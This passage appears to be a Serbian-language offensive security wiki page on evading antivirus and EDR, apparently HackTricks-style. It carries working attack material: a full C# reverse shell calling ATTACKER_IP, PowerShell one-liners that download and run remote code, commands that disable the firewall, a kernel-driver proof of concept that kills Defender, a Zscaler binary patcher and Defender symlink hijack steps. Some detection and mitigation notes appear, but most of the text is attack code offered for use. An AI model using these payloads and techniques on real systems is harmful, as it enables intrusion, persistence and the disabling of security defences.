**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da izvršni fajlovi potpisani pouzdanim sertifikatom za potpisivanje neće pokrenuti SmartScreen.

Veoma efikasan način da sprečite da vaši payloadi dobiju Mark of The Web jeste da ih upakujete u neki kontejner kao što je ISO. To je zato što se Mark-of-the-Web (MOTW) ne može primeniti na non NTFS volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u kontejnere kako bi izbegao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demo prikaza zaobilaženja SmartScreen-a pakovanjem payloads unutar ISO fajlova koristeći [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji omogućava aplikacijama i sistemskim komponentama da **zapisivaju događaje**. Međutim, može se koristiti i od strane sigurnosnih proizvoda za nadzor i detekciju malicioznih aktivnosti.

Slično kao što se AMSI onemogućava (bypasuje), moguće je i da se funkcija **`EtwEventWrite`** u user-space procesu odmah vrati bez zapisivanja bilo kakvih događaja. Ovo se postiže patchovanjem funkcije u memoriji da odmah vrati, efektivno onemogućavajući ETW logovanje za taj proces.

Više informacija možete pronaći u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binarnih fajlova u memoriju je poznato već dugo i i dalje je odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, moraćemo se samo pozabaviti patchovanjem AMSI-ja za ceo proces.

Većina C2 framework-a (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assembly-ja direktno u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

To podrazumeva **pokretanje novog žrtvovanog procesa**, injektovanje vašeg post-exploitation malicioznog koda u taj novi proces, izvršavanje vašeg malicioznog koda i po završetku, ubijanje novog procesa. Ovo ima i prednosti i mane. Prednost metode fork and run je što se izvršavanje dešava **izvan** našeg Beacon implant procesa. To znači da, ako nešto u našoj post-exploitation akciji pođe po zlu ili bude otkriveno, postoji **mnogo veća šansa** da naš **implant preživi.** Mana je što imate **veću verovatnoću** da budete otkriveni od strane **detekcija ponašanja**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation malicioznog koda **u sopstveni proces**. Na ovaj način možete izbjeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali mana je što, ako nešto pođe po zlu pri izvršavanju vašeg payload-a, postoji **mnogo veća šansa** da **izgubite svoj beacon** jer bi mogao da se sruši.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitati C# Assemblies **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod koristeći druge jezike tako što će se kompromitovanom računaru omogućiti pristup **okruženju interpreter-a instaliranom na SMB delu koji kontroliše napadač**.

Dozvoljavanjem pristupa binarnim fajlovima interpretatora i okruženju na SMB share-u možete **izvršavati proizvoljan kod u tim jezicima unutar memorije** kompromitovanog računara.

Repozitorijum navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo statičke potpise**. Testiranje sa nasumičnim neobfuskiranim reverse shell skriptama u tim jezicima se pokazalo uspešnim.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše access token-om ili sigurnosnim proizvodom poput EDR-a ili AV-a**, omogućavajući mu da smanji privilegije tako da proces ne umre, ali neće imati dozvole da proverava maliciozne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao onemogućiti eksternim procesima da dobijaju handle-ove nad token-ima sigurnosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je jednostavno instalirati Chrome Remote Desktop na žrtvin računar i zatim ga koristiti za preuzimanje kontrole i održavanje persistencije:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI fajl za Windows da biste preuzeli MSI fajl.
2. Pokrenite installer tiho na žrtvi (potrebna admin privilegija): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite next. Wizard će zatim tražiti autorizaciju; kliknite na dugme Authorize da nastavite.
4. Izvršite dati parametar uz određene prilagodbe: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: parametar pin omogućava postavljanje pina bez korišćenja GUI-a).


## Advanced Evasion

Evasion je veoma komplikovana tema; ponekad morate uzeti u obzir mnogo različitih izvora telemetrije u samo jednom sistemu, tako da je praktično nemoguće ostati potpuno neprimećen u zrelim okruženjima.

Svako okruženje sa kojim se suočavate ima sopstvene prednosti i slabosti.

Toplo vam preporučujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), da biste stekli uvid u naprednije tehnike Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odličan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok ne **utvrdi koji deo Defender** smatra malicioznim i razdeli vam ga.\
Još jedan alat koji radi **isto** je [**avred**](https://github.com/dobin/avred) sa otvorenim web servisom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows-i su dolazili sa **Telnet server-om** koji ste mogli instalirati (kao administrator) radeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrebni su vam bin fajlovi, ne instalacioni program)

**ON THE HOST**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Podesite lozinku u _VNC Password_
- Podesite lozinku u _View-Only Password_

Zatim premestite binarni fajl _**winvnc.exe**_ i **novo** kreirani fajl _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Da biste ostali neotkriveni, ne smete raditi sledeće

- Ne pokrećite `winvnc` ako već radi, jer će se pojaviti [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
- Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu jer će se otvoriti [konfiguracioni prozor](https://i.imgur.com/rfMQWcf.png)
- Ne pokrećite `winvnc -h` za pomoć jer će se pojaviti [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT-a:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** komandom `msfconsole -r file.rc` i **izvršite** **xml payload** pomoću:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni Defender će vrlo brzo prekinuti proces.**

### Kompajliranje našeg vlastitog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga uz:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršenje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje python-a za build injectors — primer:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR iz kernel prostora

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre postavljanja ransomware-a. Alat donosi svoj **vulnerable ali *potpisani* driver** i zloupotrebljava ga za izvođenje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Ključne napomene
1. **Potpisani driver**: Fajl koji se isporučuje na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto driver nosi važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz user land-a.
3. **IOCTL-ovi izloženi od strane drivera**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekinuti proizvoljni proces po PID-u (koristi se za gašenje Defender/EDR servisa) |
| `0x990000D0` | Obriši proizvoljan fajl na disku |
| `0x990001D0` | Unload-uj driver i ukloni servis |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto radi**:  BYOVD potpuno zaobilazi zaštite u user-mode-u; kod koji se izvršava u kernelu može otvoriti *zaštićene* procese, prekinuti ih ili menjati kernel objekte bez obzira na PPL/PP, ELAM ili druge mehanizme ojačanja.

Detekcija / Mitigacija
•  Omogućite Microsoft-ovu listu blokiranih ranjivih drivera (`HVCI`, `Smart App Control`) kako bi Windows odbio da učita `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i alarmirajte kada se driver učita iz direktorijuma upisivog za sve korisnike ili nije prisutan na allow-listi.
•  Pazite na user-mode handle-ove ka custom device objektima koji su praćeni sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler-ov **Client Connector** primenjuje pravila o stanju uređaja lokalno i oslanja se na Windows RPC da komunicira rezultate drugim komponentama. Dve slabe dizajnerske odluke omogućavaju potpuni zaobilaženje:

1. Procena posture se odvija **potpuno na klijentu** (serveru se šalje samo boolean).
2. Interni RPC endpoint-i samo proveravaju da je izvršni fajl **potpisan od strane Zscaler-a** (putem `WinVerifyTrust`).

Patch-ovanjem četiri potpisana binarna fajla na disku obe mehanike se mogu neutralisati:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` pa je svaka provera usklađena |
| `ZSAService.exe` | Indirektni poziv `WinVerifyTrust` | NOP-ovan ⇒ bilo koji (čak i nepotpisan) proces može da se poveže na RPC pipe-ove |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Presečeno / skraćeno |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i restartovanja servisnog steka:

* **Sve** posture checks prikazuju **green/compliant**.
* Nepotpisani ili izmenjeni binarni fajlovi mogu otvoriti named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup unutrašnjoj mreži definisanoj Zscaler politikama.

Ova studija slučaja pokazuje kako odluke o poverenju koje se donose isključivo na strani klijenta i jednostavne provere potpisa mogu biti zaobiđene sa nekoliko byte patch-eva.

## Zloupotreba Protected Process Light (PPL) za manipulaciju AV/EDR koristeći LOLBINs

Protected Process Light (PPL) nameće hijerarhiju potpisivača/nivoa tako da samo zaštićeni procesi istog ili višeg nivoa mogu međusobno manipulisati. Ofanzivno, ako možete legitimno pokrenuti PPL-enabled binarni fajl i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničenu, PPL-podržanu write primitive protiv zaštićenih direktorijuma koje koriste AV/EDR.

Šta čini proces da se pokrene kao PPL
- Ciljni EXE (i sve učitane DLLs) moraju biti potpisani sa PPL-capable EKU.
- Proces mora biti kreiran pomoću CreateProcess koristeći flagove: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Kompatibilan nivo zaštite mora biti zatražen koji odgovara potpisivaču binarnog fajla (npr. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware potpisivače, `PROTECTION_LEVEL_WINDOWS` za Windows potpisivače). Pogrešni nivoi će rezultovati neuspehom pri kreiranju.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selektuje nivo zaštite i prosleđuje argumente ciljanom EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Šablon upotrebe:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarni fajl `C:\Windows\System32\ClipUp.exe` samostalno se pokreće (self-spawns) i prihvata parametar za upis log fajla na putanju koju navede pozivatelj.
- Kada se pokrene kao PPL proces, upis fajla se izvršava uz PPL podršku.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristite 8.3 short paths da biste ciljali u obično zaštićene lokacije.

8.3 short path helpers
- Prikaži short nazive: `dir /x` u svakom roditeljskom direktorijumu.
- Izvedi short putanju u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokrenite PPL-sposoban LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći launcher (npr. CreateProcessAsPPL).
2) Prosledite ClipUp log-path argument da biste primorali kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristite 8.3 short names ako je potrebno.
3) Ako je ciljni binarni fajl obično otvoren/zaključan od strane AV dok radi (npr. MsMpEng.exe), zakažite upis pri boot-u pre nego što AV startuje instaliranjem auto-start servisa koji pouzdano radi ranije. Proverite redosled pri boot-u sa Process Monitor (boot logging).
4) Na reboot-u PPL-podržani upis se dešava pre nego što AV zaključa svoje binarne fajlove, korumpirajući ciljni fajl i onemogućavajući pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje izvan lokacije; primitiv je pogodan za korupciju podataka, a ne za preciznu injekciju sadržaja.
- Za instaliranje/pokretanje servisa i prozor za restart potrebni su lokalni admin/SYSTEM privilegije.
- Vreme je kritično: cilj ne sme biti otvoren; izvršavanje pri podizanju sistema (boot-time) izbegava zaključavanje fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neuobičajenim argumentima, naročito ako je parentovan od strane nestandardnih pokretača, oko podizanja sistema.
- Novi servisi konfigurisani da auto-startuju sumnjive binarije i koji redovno startuju pre Defender/AV. Istražite kreiranje/izmenu servisa pre grešaka pri pokretanju Defender-a.
- Monitoring integriteta fajlova na Defender binarijama/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od procesa sa protected-process zastavicama.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane non-AV binarija.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binariji smeju da se izvršavaju kao PPL i pod kojim parentima; blokirajte pozive ClipUp izvan legitimnih konteksta.
- Održavanje servisa: ograničite kreiranje/izmenu auto-start servisa i nadgledajte manipulaciju redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch zaštite omogućeni; istražite greške pri startovanju koje ukazuju na korupciju binarija.
- Razmotrite onemogućavanje 8.3 short-name generisanja na volumima koji hostuju alatke za bezbednost ako je kompatibilno sa vašim okruženjem (temeljno testirati).

Reference za PPL i alatke
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulisanje Microsoft Defender putem Platform Version Folder Symlink Hijack

Windows Defender odabira platformu iz koje se izvršava tako što nabraja podfoldere ispod:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

On izabere podfolder sa najvišim leksikografskim verzijskim stringom (npr. `4.18.25070.5-0`), potom pokreće Defender servisne procese iz te lokacije (i ažurira service/registry putanje u skladu s tim). Ovaj izbor veruje unosima direktorijuma uključujući directory reparse point-ove (symlinks). Administrator može iskoristiti ovo da preusmeri Defender na putanju koja je writable od strane napadača i postigne DLL sideloading ili ometanje servisa.

Preduslovi
- Lokalni Administrator (potreban za kreiranje direktorijuma/symlinka unutar Platform foldera)
- Mogućnost restartovanja ili izazivanja ponovnog izbora platforme Defender-a (restart servisa pri boot-u)
- Potrebni su samo ugrađeni alati (mklink)

Zašto ovo funkcioniše
- Defender blokira upise u sopstvene foldere, ali izbor platforme veruje stavkama direktorijuma i bira leksikografski najvišu verziju bez validacije da li target rezolvuje u zaštićenu/poverljivu putanju.

Korak-po-korak (primer)
1) Pripremite writable klon trenutnog platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte directory symlink za višu verziju unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučeno ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće iz preusmerenog puta:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Treba da primetite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registry koja odražava tu lokaciju.

Post-exploitation opcije
- DLL sideloading/code execution: Postavite/zamenite DLLs koje Defender učitava iz direktorijuma aplikacije da biste izvršili code u Defender-ovim procesima. Pogledajte odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da pri sledećem pokretanju konfigurisana putanja ne može da se reši i Defender neće uspeti da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte u vidu da ova tehnika sama po sebi ne obezbeđuje privilege escalation; zahteva admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red timovi mogu premestiti runtime evasion iz C2 implant-a u sam ciljajući modul tako što će hookovati njegov Import Address Table (IAT) i rutirati odabrane API-je kroz attacker-controlled, position‑independent code (PIC). Ovo generalizuje evasion izvan uskog API surfaca koji mnogi kitovi izlažu (npr. CreateProcessA), i proširuje iste zaštite na BOFs i post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
